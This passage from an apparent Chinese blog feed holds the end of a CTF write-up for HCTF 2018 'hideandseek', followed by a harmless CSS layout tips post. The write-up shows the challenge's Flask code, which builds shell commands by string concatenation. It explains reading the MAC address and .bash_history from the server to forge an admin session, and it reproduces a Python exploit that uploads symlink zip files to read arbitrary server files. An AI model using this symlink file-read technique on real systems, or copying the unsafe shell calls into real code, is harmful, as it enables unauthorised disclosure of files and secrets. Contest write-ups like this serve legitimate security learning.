request.files[&apos;the_file&apos;]</span><br><span class="line">    if file.filename == &apos;&apos;:</span><br><span class="line">        return redirect(url_for(&apos;index&apos;))</span><br><span class="line">    if file and allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        file_save_path = os.path.join(app.config[&apos;UPLOAD_FOLDER&apos;], filename)</span><br><span class="line">        if(os.path.exists(file_save_path)):</span><br><span class="line">            return &apos;This file already exists&apos;</span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    else:</span><br><span class="line">        return &apos;This file is not a zipfile&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        extract_path = file_save_path + &apos;_&apos;</span><br><span class="line">        os.system(&apos;unzip -n &apos; + file_save_path + &apos; -d &apos;+ extract_path)</span><br><span class="line">        read_obj = os.popen(&apos;cat &apos; + extract_path + &apos;/*&apos;)</span><br><span class="line">        file = read_obj.read()</span><br><span class="line">        read_obj.close()</span><br><span class="line">        os.system(&apos;rm -rf &apos; + extract_path)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        file = None</span><br><span class="line"></span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    if(file != None):</span><br><span class="line">        if(file.find(base64.b64decode(&apos;aGN0Zg==&apos;).decode(&apos;utf-8&apos;)) != -1):</span><br><span class="line">            return redirect(url_for(&apos;index&apos;, error=1))</span><br><span class="line">    return Response(file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    #app.run(debug=True)</span><br><span class="line">    app.run(host=&apos;127.0.0.1&apos;, debug=True, port=10008)</span><br></pre></td></tr></table></figure></p><p>看到他import了flag，直接去读flag，然鹅..直接被拦了<br><img src="http://static.zybuluo.com/Passer6y/f1ocjg7yf4dva04z7tuqsvq1/image_1d2trt9n9125b1u8bcajrf1jl613.png" alt="image_1d2trt9n9125b1u8bcajrf1jl613.png-61.6kB"></p><p>所以现在思路就是越权成为admin，这里使用的一个固定的随机数种子，uuid.getnode()获得10进制mac地址，可以在/sys/class/net/eth0/address读到mac地址，所以可以伪造session越权称为admin，</p><p>读到mac地址：<code>02:42:ac:11:00:02</code>，在线转成10进制：<br><a href="https://www.vultr.com/tools/mac-converter/?mac_address=02%3A42%3Aac%3A11%3A00%3A02" target="_blank" rel="noopener">https://www.vultr.com/tools/mac-converter/?mac_address=02%3A42%3Aac%3A11%3A00%3A02</a><br>得到种子：2485377892354</p><p>然后本地搭一下flask环境拿到session即可得到flag。</p><p>最后看了其他师傅们的wp，还可以读.bash_history等等，这里嫖了一个exp(我全程手动操作的..)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import random </span><br><span class="line">import os</span><br><span class="line">import string</span><br><span class="line">import time</span><br><span class="line">import zipfile</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def generate_zip(path,i):</span><br><span class="line">    zip_name =  &apos;moxiaoxi&apos;+str(i)+&apos;.zip&apos;</span><br><span class="line">    link_namme = &apos;moxiaoxi&apos;+str(i)</span><br><span class="line">    os.system(&quot;ln -s &#123;&#125; &#123;&#125;&quot;.format(path,link_namme))</span><br><span class="line">    print &quot;ln -s &#123;&#125; &#123;&#125;&quot;.format(path,link_namme)</span><br><span class="line">    os.system(&quot;zip -y &#123;&#125; &#123;&#125;&quot;.format(zip_name,link_namme))</span><br><span class="line">    with open(zip_name,&apos;r&apos;) as f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    return zip_name,data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exp(path,i):</span><br><span class="line">    zip_name,data = generate_zip(path,i)</span><br><span class="line">    # zip_name,data = rewrite(path,i)</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    paramsPost = &#123;&quot;submit&quot;:&quot;Submit&quot;&#125;</span><br><span class="line">    paramsMultipart = [(&apos;the_file&apos;, (zip_name, data, &apos;application/zip&apos;))]</span><br><span class="line">    headers = &#123;&quot;Accept&quot;:&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,&quot;Upgrade-Insecure-Requests&quot;:&quot;1&quot;,&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Linux; Android 9.0; SAMSUNG-SM-T377A Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Mobile Safari/537.36&quot;,&quot;Referer&quot;:&quot;http://hideandseek.2018.hctf.io/&quot;,&quot;Connection&quot;:&quot;close&quot;,&quot;Accept-Language&quot;:&quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;,&quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,&quot;DNT&quot;:&quot;1&quot;&#125;</span><br><span class="line">    cookies = &#123;&quot;session&quot;:&quot;eyJ1c2VybmFtZSI6Im1veGlhb3hpIn0.Dsf5zA.yM84QphtcfEoykAu2lwjxp7_QvI&quot;&#125;</span><br><span class="line">    response = session.post(&quot;http://hideandseek.2018.hctf.io/upload&quot;, data=paramsPost, files=paramsMultipart, headers=headers, cookies=cookies)</span><br><span class="line"></span><br><span class="line">    print(&quot;Status code: %i&quot; % response.status_code)</span><br><span class="line">    print(&quot;Response body: %s&quot; % response.content)</span><br><span class="line">    if len(response.content)&gt;5:</span><br><span class="line">        # print(&quot;Response body: %s&quot; % response.content)</span><br><span class="line">        with open(&apos;out.txt&apos;,&apos;a+&apos;) as f:</span><br><span class="line">            f.write(&apos;\n\n&#123;&#125;\n\n&#123;&#125;&apos;.format(path,response.content)) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__==&apos;__main__&apos;:</span><br><span class="line">    name =  &apos;test&apos;+&apos;&apos;.join(random.sample(string.ascii_letters + string.digits, 4))</span><br><span class="line">    exp(sys.argv[1],name)</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;近来有时间补了一下之前比赛遗留下来的wp&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://0day.design/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://0day.design/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CSS Tricks</title>
    <link href="http://0day.design/2019/01/29/CSS%20Tricks/"/>
    <id>http://0day.design/2019/01/29/CSS Tricks/</id>
    <published>2019-01-29T12:30:00.000Z</published>
    <updated>2019-02-10T09:34:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>接上一篇文章，学习css中踩的坑，一些小的知识点汇总，wiki的前端设计也总算是可以告一段落了，效果图：<br><a id="more"></a><br><img src="https://i.loli.net/2019/01/29/5c4fc69d0dc92.png" alt=""></p><h2 id="水平-垂直居中总结："><a href="#水平-垂直居中总结：" class="headerlink" title="水平/垂直居中总结："></a>水平/垂直居中总结：</h2><p>行内元素: 用<code>text-align:center</code>居中，用<code>line-height</code>垂直居中；</p><p>块状元素: 用<code>margin: 0 auto</code>水平居中，垂直居中用：<code>display:table-cell; vertical-align:middle</code>。<br>如果已设块状元素高度，可以将margin-top和margin-bottom设为：(父元素高度-子元素高度)/2；</p><p>水平垂直同时居中还有一种办法，将父元素position设为relative，该元素设为absolute，然后<code>margin:auto</code>即可。</p><p>other:<br>实际开发中遇到的一个问题，使用了绝对定位交叉轴位置(设置了top),如果此时想实现在水平自动定位的话，得给他加一个子标签，然后用<code>margin: 0 auto</code>,父标签记得设置宽度<code>width: 100%</code></p><p>还有一种办法即,子盒子设百分比宽高，边距用相对的position调整<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.feature-3&#123;</span><br><span class="line">    width: 100%;</span><br><span class="line">    height: 1000px;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">.feature-3 .feature-box&#123;</span><br><span class="line">    width: 72%;</span><br><span class="line">    height: 90%;</span><br><span class="line">    margin: 0 auto;</span><br><span class="line">    position: relative;</span><br><span class="line">    top: 25px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><blockquote><p>参考： <a href="http://www.cnblogs.com/chaixiaozhi/p/8490725.html" target="_blank" rel="noopener">http://www.cnblogs.com/chaixiaozhi/p/8490725.html</a></p></blockquote><h2 id="input标签透明"><a href="#input标签透明" class="headerlink" title="input标签透明"></a>input标签透明</h2><p><code>background-color: transparent;</code></p><h2 id="背景图高度自适应问题"><a href="#背景图高度自适应问题" class="headerlink" title="背景图高度自适应问题"></a>背景图高度自适应问题</h2><p>我们想让一个背景图纵向填充整个屏幕, 要先将其父元素全部使用高度100%自适应，这样子元素才会生效<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">html,body&#123;</span><br><span class="line">    height: 100%;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.menu&#123;</span><br><span class="line">    height: 100%;</span><br><span class="line">    width: 100px;</span><br><span class="line">    background: url(&apos;image/Base.png&apos;);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="字体图片在列表中对不齐时"><a href="#字体图片在列表中对不齐时" class="headerlink" title="字体图片在列表中对不齐时"></a>字体图片在列表中对不齐时</h2><p><img src="http://static.zybuluo.com/Passer6y/3w8wpzp1i5oc0fdf6gppbm54/image_1d25eive5171i1kc91s233mt4og9.png" alt="image_1d25eive5171i1kc91s233mt4og9.png-14.9kB"></p><p>给每个图指定宽度，垂直居中即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">img&#123;</span><br><span class="line">    width: 18px;</span><br><span class="line">    vertical-align:middle;//指定行内元素（inline）或表格单元格（table-cell）元素的垂直对齐方式。</span><br><span class="line">    margin-right: 5px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;dl&gt;</span><br><span class="line">    &lt;dt&gt;YOUR PEODUCTS &lt;img src=&quot;image/Settings.png&quot; alt=&quot;&quot;&gt;&lt;/dt&gt;</span><br><span class="line">    &lt;dd&gt;&lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;image/Book of Wisdom.png&quot; alt=&quot;&quot;&gt; Book&lt;/a&gt;&lt;/dd&gt;</span><br><span class="line">    &lt;dd&gt;&lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;image/Video Camera.png&quot; alt=&quot;&quot;&gt; Tutorials&lt;/a&gt;&lt;/dd&gt;</span><br><span class="line">    &lt;dd&gt;&lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;image/Chart.png&quot; alt=&quot;&quot;&gt; Stocks&lt;/a&gt;&lt;/dd&gt;</span><br><span class="line">    &lt;dd&gt;&lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;image/Painting.png&quot; alt=&quot;&quot;&gt;  Infographics&lt;/a&gt;&lt;/dd&gt;</span><br><span class="line">&lt;/dl&gt;</span><br></pre></td></tr></table></figure></p><h2 id="将非可点击的元素设置悬停由鼠标指针变成手"><a href="#将非可点击的元素设置悬停由鼠标指针变成手" class="headerlink" title="将非可点击的元素设置悬停由鼠标指针变成手"></a>将非可点击的元素设置悬停由鼠标指针变成手</h2><p><code>cursor: pointer;</code><br><img src="http://static.zybuluo.com/Passer6y/q6t8l98fu8cjr756k4km9r2r/image_1d29dv0dn3dh12j9cn21jpfd4v9.png" alt="image_1d29dv0dn3dh12j9cn21jpfd4v9.png-1.2kB"></p><h2 id="搜索框写法"><a href="#搜索框写法" class="headerlink" title="搜索框写法"></a>搜索框写法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">.search&#123;</span><br><span class="line">        height: 70px;</span><br><span class="line">        width: 100%;</span><br><span class="line">        border-bottom: 1px solid #ccc;</span><br><span class="line">        border-right: 1px solid #ccc;</span><br><span class="line">        position: absolute;</span><br><span class="line">        top:0;</span><br><span class="line">&#125;</span><br><span class="line">.search .search-box&#123;</span><br><span class="line">    display: block;</span><br><span class="line">    width: 340px;</span><br><span class="line">    height: 35px;</span><br><span class="line">    margin: 0 auto;</span><br><span class="line">    margin-top: 17.5px;     /*居中的另外一种写法，(父元素高-子元素高)/2*/</span><br><span class="line">    margin-bottom: 17.5px;</span><br><span class="line">    border: 1px solid rgba(0, 0, 0, 0.1);</span><br><span class="line">    border-radius: 8px;</span><br><span class="line">    text-indent: 1em;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">.search .search-box .m-search&#123;</span><br><span class="line">    height: 100%;</span><br><span class="line">    width: 85%;</span><br><span class="line">    outline: none;   /*关闭聚焦时的外框*/</span><br><span class="line">&#125;</span><br><span class="line">.search .search-box img&#123;</span><br><span class="line">    width: auto;</span><br><span class="line">    height: auto;</span><br><span class="line">    position: relative;</span><br><span class="line">    top:3px;</span><br><span class="line">    left: 2px;</span><br><span class="line">    cursor: pointer;  /*悬停变成小手*/</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;search&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;search-box&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; class=&quot;m-search&quot; placeholder=&quot;Search&quot;&gt;</span><br><span class="line">        &lt;img src=&quot;image/Search icon.png&quot; alt=&quot;&quot;&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><h2 id="给图片加悬浮阴影效果"><a href="#给图片加悬浮阴影效果" class="headerlink" title="给图片加悬浮阴影效果"></a>给图片加悬浮阴影效果</h2><p><img src="http://static.zybuluo.com/Passer6y/aj81y4td1xw6dkbqxkoyzim6/image_1d1vlr1c4dh916qj1h7tguvmg3m.png" alt="image_1d1vlr1c4dh916qj1h7tguvmg3m.png-73.4kB"></p><p>两个图片放入同一个父盒子，将hover效果图利用定位，定位到和初始图一个位置，设好hover效果图初始为不可见，然后用<code>:hover</code>改变透明度。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.team-name&#123;</span><br><span class="line">    margin: 10px 10px;</span><br><span class="line">    position: relative;</span><br><span class="line">&#125;</span><br><span class="line">.team-name .cover&#123;</span><br><span class="line">    opacity: 0;  /*将覆盖的图设为不可见*/</span><br><span class="line">    position: absolute;   /*将覆盖图和原始图定位到同一个位置*/</span><br><span class="line">    top: 0;</span><br><span class="line">    bottom: 0;</span><br><span class="line">    left: 0;</span><br><span class="line">    right: 0;</span><br><span class="line">    z-index: 1;</span><br><span class="line">&#125;</span><br><span class="line">.team-name:hover .cover&#123;</span><br><span class="line">    opacity: 0.9;   </span><br><span class="line">&#125;</span><br><span class="line">&lt;div class=&quot;team-name&quot;&gt;</span><br><span class="line">    &lt;img src=&quot;images/Userpic-1.jpg&quot; alt=&quot;&quot;&gt;&lt;!--初始图--&gt;</span><br><span class="line">    &lt;div&gt;&lt;img class=&quot;cover&quot; src=&quot;images/active.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;!--hover后覆盖的图--&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>完整效果：<br>悬浮阴影效果.gif<img src="http://static.zybuluo.com/Passer6y/praniz3d8yq8oyia3l6zkdtk/image_1d1vlp4881ulh169gvg51t5o1o189.png" alt="image_1d1vlp4881ulh169gvg51t5o1o189.png-132.8kB"></p><h2 id="实现边线上加文字效果"><a href="#实现边线上加文字效果" class="headerlink" title="实现边线上加文字效果"></a>实现边线上加文字效果</h2><p><img src="http://static.zybuluo.com/Passer6y/vvdjst8rivr4xr591gn3eu03/image_1d2alqq46bod1t5a1s3a1kq9c2m.png" alt="image_1d2alqq46bod1t5a1s3a1kq9c2m.png-4kB"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.line&#123;</span><br><span class="line">        height: 1px;</span><br><span class="line">        text-align: center;  /*让span中间文字到中间*/</span><br><span class="line">        border: 1px solid #ccc;</span><br><span class="line">    &#125;</span><br><span class="line">.line span&#123;</span><br><span class="line">        position: relative;</span><br><span class="line">        top: -12px;         /*移动到线上*/</span><br><span class="line">        font-size: 14px;</span><br><span class="line">        color: #7f8fa4;</span><br><span class="line">        background: white;</span><br><span class="line">        padding: 0 20px;</span><br><span class="line">    &#125;</span><br><span class="line"> &lt;div class=&quot;line&quot;&gt;&lt;span&gt;↑ 安全客推送 ↑&lt;/span&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure><h2 id="在元素盒子前加上小光点"><a href="#在元素盒子前加上小光点" class="headerlink" title="在元素盒子前加上小光点"></a>在元素盒子前加上小光点</h2><p>使用::before伪元素，使用负的left移到盒子前面。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.choose::before&#123;</span><br><span class="line">    content: &quot;&quot;;</span><br><span class="line">    position: absolute;</span><br><span class="line">    border-radius: 100px;</span><br><span class="line">    display: block;</span><br><span class="line">    box-shadow: 1px 0 5px 2px #214e74;</span><br><span class="line">    width: 2px;</span><br><span class="line">    height: 4px;</span><br><span class="line">    background-color: #2399f1;</span><br><span class="line">    top: 60px;</span><br><span class="line">    left: -29px;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p><img src="http://static.zybuluo.com/Passer6y/kfd9y462ydnkh67una4j0rnf/image_1d27dmc2u93e1na31d9t1iolcn19.png" alt="image_1d27dmc2u93e1na31d9t1iolcn19.png-10.8kB"></p><h2 id="左右两栏固定布局方法"><a href="#左右两栏固定布局方法" class="headerlink" title="左右两栏固定布局方法"></a>左右两栏固定布局方法</h2><ol><li><p>使用float布局</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">    .left-float&#123;</span><br><span class="line">        float: left;</span><br><span class="line">        width: 30%;</span><br><span class="line">        height: 100px;</span><br><span class="line">        background: rgb(17, 0, 255);</span><br><span class="line">    &#125;</span><br><span class="line">    .right-float&#123;</span><br><span class="line">        float:right;</span><br><span class="line">        width: 70%;</span><br><span class="line">        height: 100px;</span><br><span class="line">        background: rgb(77, 209, 77);</span><br><span class="line">    &#125;</span><br><span class="line">&lt;div class=&quot;left-float&quot;&gt;left-float/div&gt;</span><br><span class="line">&lt;div class=&quot;right-float&quot;&gt;right-float&lt;/div&gt;</span><br></pre></td></tr></table></figure></li><li><p>使用flex进行布局(好用！)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.flex&#123;</span><br><span class="line">    display: flex;</span><br><span class="line">&#125;</span><br><span class="line">.left-flex&#123;</span><br><span class="line">    flex:3;</span><br><span class="line">    background:hotpink</span><br><span class="line">&#125;</span><br><span class="line">.right-flex&#123;</span><br><span class="line">    flex:7;</span><br><span class="line">    background:khaki;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;flex&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;left-flex&quot;&gt;left-flex&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;right-flex&quot;&gt;right-flex&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></li><li><p>使用绝对定位布局(不推荐)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.left-position&#123;</span><br><span class="line">    position:absolute;</span><br><span class="line">    top: 100px;</span><br><span class="line">    left: 0;</span><br><span class="line">    width: 30%;</span><br><span class="line">    background:rgb(0, 140, 255);</span><br><span class="line">&#125;</span><br><span class="line">.right-position&#123;</span><br><span class="line">    position:absolute;</span><br><span class="line">    right: 0;</span><br><span class="line">    top: 100px;</span><br><span class="line">    width:70%;</span><br><span class="line">    background: rgb(202, 127, 30);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;left-position&quot;&gt;left-position&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;right-position&quot;&gt;right-position&lt;/div&gt;</span><br></pre></td></tr></table></figure></li></ol><h2 id="左固定右动态的两列布局"><a href="#左固定右动态的两列布局" class="headerlink" title="左固定右动态的两列布局"></a>左固定右动态的两列布局</h2><ol><li>float+BFC方法<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.left-float&#123;</span><br><span class="line">    float: left;</span><br><span class="line">    width:200px;</span><br><span class="line">    height: 500px;</span><br><span class="line">    color: black;</span><br><span class="line">    background: rgb(228, 139, 23);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">.right-float&#123;</span><br><span class="line">    background: red;</span><br><span class="line">    height: 500px;  </span><br><span class="line">    margin-left: 205px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;div class=&quot;left-float&quot;&gt;left&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;right-float&quot;&gt;right&lt;/div&gt;</span><br></pre></td></tr></table></figure></li></ol><p><img src="http://static.zybuluo.com/Passer6y/0uyx9kinkbftwwi31lfxp5mj/image_1d1io2sksu1q1pom1dnk1mmo14ci9.png" alt="image_1d1io2sksu1q1pom1dnk1mmo14ci9.png-4.3kB"></p><ol start="2"><li><p>absolute + margin-left</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">    .left-absolute&#123;</span><br><span class="line">        position: absolute;</span><br><span class="line">        width: 200px;</span><br><span class="line">        height: 500px;</span><br><span class="line">        left:0;</span><br><span class="line">        background: rgb(255, 187, 0);</span><br><span class="line">    &#125;</span><br><span class="line">    .right-absolute&#123;</span><br><span class="line">        margin-left: 205px;</span><br><span class="line">        height: 500px;</span><br><span class="line">        background: red;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;div class=&quot;left-absolute&quot;&gt;left-absolute&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;right-absolute&quot;&gt;right-absolute&lt;/div&gt;</span><br></pre></td></tr></table></figure></li><li><p>flex(好用！)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.left-flex&#123;</span><br><span class="line">    flex: 0 0 200px;</span><br><span class="line">    background: red;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">.right-flex&#123;</span><br><span class="line">    flex: 1 1 auto;</span><br><span class="line">    background: green;</span><br><span class="line">&#125;</span><br><span class="line">&lt;div class=&quot;flex&quot;&gt; </span><br><span class="line">    &lt;div class=&quot;left-flex&quot;&gt;left-flex&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;right-flex&quot;&gt;right-flex&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></li></ol><p><code>flex: 0 0 200px</code>：表示值为固定200px，不和其他元素成比例关系，同时宽度不够时也不会收缩，即固定。</p><h2 id="margin-为负值的用法"><a href="#margin-为负值的用法" class="headerlink" title="margin 为负值的用法"></a>margin 为负值的用法</h2><p><img src="http://static.zybuluo.com/Passer6y/std68hkyagic8vdpqp0vzk9o/image_1d1hvl9ne17i410q2ln19e213ls9.png" alt="image_1d1hvl9ne17i410q2ln19e213ls9.png-64kB"></p><p>margin的参考线有两类，一类是top、left，它们以外元素作为参考线，另一类是right、bottom，它们以自身作为参考线。<br>简单点说就是：</p><ul><li>top负值就是以包含块(Containing block) 内容区域的上边或者上方相连元素 margin 的下边为参考线;</li><li>left负值就是以包含块(Containing block) 内容区域的左边或者左方相连元素 margin 的右边为参考线;</li><li>right负值就是以元素本身border的右边为参考线；</li><li>bottom负值就是以元素本身border的下边为参考线；</li></ul><h2 id="双飞翼布局"><a href="#双飞翼布局" class="headerlink" title="双飞翼布局"></a>双飞翼布局</h2><p>即三栏布局，两边盒子固定，中间盒子自适应的布局<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;col-main&quot;&gt;我是主列&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;col-sub&quot;&gt;我是子列&lt;/div&gt;</span><br><span class="line">&lt;div 